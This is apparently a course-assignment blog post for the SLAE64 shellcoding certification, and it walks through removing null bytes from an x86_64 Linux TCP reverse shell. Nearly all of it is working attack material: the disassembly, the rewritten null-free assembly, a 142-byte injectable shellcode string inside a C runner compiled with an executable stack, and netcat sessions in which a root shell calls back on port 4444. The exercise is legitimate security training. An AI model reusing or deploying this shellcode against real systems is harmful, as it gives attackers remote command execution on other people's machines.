---
title: SLAE64 Assignment 2 - Remove Nulls TCP Reverse Shell
date: 2020-4-28
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE64.png
tags:
  - Shell
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE64.png)

## Overview
The second part of the second assignment of SLAE64 was to remove the nulls from the reverse-shell provided by Pentester Academy.

## Compiling & Testing Original - With NASM & LD
The shellcode works great if it is compiled and ran as its own program. This means the shellcode logic is good. 

#### Terminal 1
Start a netcat listener on port 4444 before executing the shellcode.
```bash
root# nc -nvlp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37596
id
uid=0(root) gid=0(root) groups=0(root)
```
#### Terminal 2
```bash
root# nasm -f elf64 RevShell.nasm -o RevShell.o
root# ld RevShell.o -o RevShell
root# vi RevShell.nasm
root# ./RevShell

```
## Removing Nulls
To make this shellcode injectable into most host programs, we will need to remove the `0x00` aka `Nulls`.

To determine which assembly instructions are producing the nulls, we will use `objdump` on the object file.

### Finding the Nulls with `objdump`
```bash
root# objdump -D RevShell.o -M intel
   0:   b8 29 00 00 00          mov    eax,0x29
   5:   bf 02 00 00 00          mov    edi,0x2
   a:   be 01 00 00 00          mov    esi,0x1
   f:   ba 00 00 00 00          mov    edx,0x0
  14:   0f 05                   syscall
  16:   48 89 c7                mov    rdi,rax
  19:   48 31 c0                xor    rax,rax
  1c:   50                      push   rax
  1d:   c7 44 24 fc 7f 00 00    mov    DWORD PTR [rsp-0x4],0x100007f
  24:   01
  25:   66 c7 44 24 fa 11 5c    mov    WORD PTR [rsp-0x6],0x5c11
  2c:   66 c7 44 24 f8 02 00    mov    WORD PTR [rsp-0x8],0x2
  33:   48 83 ec 08             sub    rsp,0x8
  37:   b8 2a 00 00 00          mov    eax,0x2a
  3c:   48 89 e6                mov    rsi,rsp
  3f:   ba 10 00 00 00          mov    edx,0x10
  44:   0f 05                   syscall
  46:   b8 21 00 00 00          mov    eax,0x21
  4b:   be 00 00 00 00          mov    esi,0x0
  50:   0f 05                   syscall
  52:   b8 21 00 00 00          mov    eax,0x21
  57:   be 01 00 00 00          mov    esi,0x1
  5c:   0f 05                   syscall
  5e:   b8 21 00 00 00          mov    eax,0x21
  63:   be 02 00 00 00          mov    esi,0x2
  68:   0f 05                   syscall
  6a:   48 31 c0                xor    rax,rax
  6d:   50                      push   rax
  6e:   48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
  75:   2f 73 68
  78:   53                      push   rbx
  79:   48 89 e7                mov    rdi,rsp
  7c:   50                      push   rax
  7d:   48 89 e2                mov    rdx,rsp
  80:   57                      push   rdi
  81:   48 89 e6                mov    rsi,rsp
  84:   48 83 c0 3b             add    rax,0x3b
  88:   0f 05                   syscall
```

+ After investigating the shellcode, we can see that the Nulls exist due to the mov instructions used.

## Modified Null-Free Shellcode

```nasm
global _start
_start:
jmp short makeSocket
clearRegz:
xor rsi, rsi
mul rsi
push rsi
pop rdi
ret
makeSocket:
; sock = socket(AF_INET, SOCK_STREAM, 0)
; AF_INET = 2 ; SOCK_STREAM = 1 ; syscall number 41
call clearRegz
add rax, 41
add rdi, 2
add rsi, 1
add rdx, 0
syscall
; copy socket descriptor to rdi for future use
mov r8, rax ; r8 = socket-fd
; server.sin_family = AF_INET
; server.sin_port = htons(PORT)
; server.sin_addr.s_addr = inet_addr("127.0.0.1")
; bzero(&server.sin_zero, 8)
call clearRegz
push rax
push dword 0x0101017f
push word 0x5c11 ; push 2 bytes for TCP Port 4444
inc rdx
inc rdx
push dx ; AF-INET
; connect(sock, (struct sockaddr *)&server, sockaddr_len)
add rax, 42
mov rsi, rsp
push r8
pop rdi ; sock-fd
add dl, 0xe ; sizeof(sockaddr)
syscall
; duplicate sockets
; dup2 (new, old)
call clearRegz
mov rdi, r8 ; sock-fd
add rax, 33
syscall
xor rax, rax
add rax, 33
inc rsi
syscall
xor rax, rax
add rax, 33
inc rsi
syscall
; execve
; First NULL push
xor rax, rax
push rax
; push /bin//sh in reverse
mov rbx, 0x68732f2f6e69622f
push rbx
; store /bin//sh address in RDI
mov rdi, rsp
; Second NULL push
push rax
; set RDX
mov rdx, rsp
; Push address of /bin//sh
push rdi
; set RSI
mov rsi, rsp
; Call the Execve syscall
add rax, 59
syscall
```

## Assemble the new shellcode

```bash
root# nasm -f elf64 mod-revshell.asm -o mod-revshell.o
root# for i in $(objdump -D mod-revshell.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo ''
```

## Add the Modified Shellcode to the C Host Program

```c
#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = \
"\xeb\x09\x48\x31\xf6\x48\xf7\xe6\x56\x5f\xc3\xe8"
"\xf2\xff\xff\xff\x48\x83\xc0\x29\x48\xff\xc6\x48"
"\xff\xc7\x48\xff\xc7\x0f\x05\x49\x89\xc0\xe8\xdb"
"\xff\xff\xff\x50\x68\x7f\x01\x01\x01\x66\x68\x11"
"\x5c\x48\xff\xc2\x48\xff\xc2\x66\x52\x48\x83\xc0"
"\x2a\x48\x89\xe6\x41\x50\x5f\x80\xc2\x0e\x0f\x05"
"\xe8\xb5\xff\xff\xff\x4c\x89\xc7\x48\x83\xc0\x21"
"\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\xff\xc6"
"\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\xff\xc6"
"\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e"
"\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2"
"\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
int main()
{
 printf("Shellcode Length:  %d\n", strlen(shellcode));
 int (*ret)() = (int(*)())shellcode;
 ret();
}
```


#### Terminal 1
```bash
root# nc -nlvp 4444
listening on [any] 4444 ...
connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 40608
id
uid=0(root) gid=0(root) groups=0(root)
```

#### Terminal 2
```bash
root# gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode
root# ./shellcode
Shellcode Length:  142
```
+ Awesome! Our Null-Free modified reverse shell works!!


## SLAE64 Blog Proof
```bash
This blog post has been created for completing the requirements of the x86_64 Assembly Language and Shellcoding on Linux (SLAE64):
    https://www.pentesteracademy.com/course?id=7
SLAE/Student ID: PA-10913
```

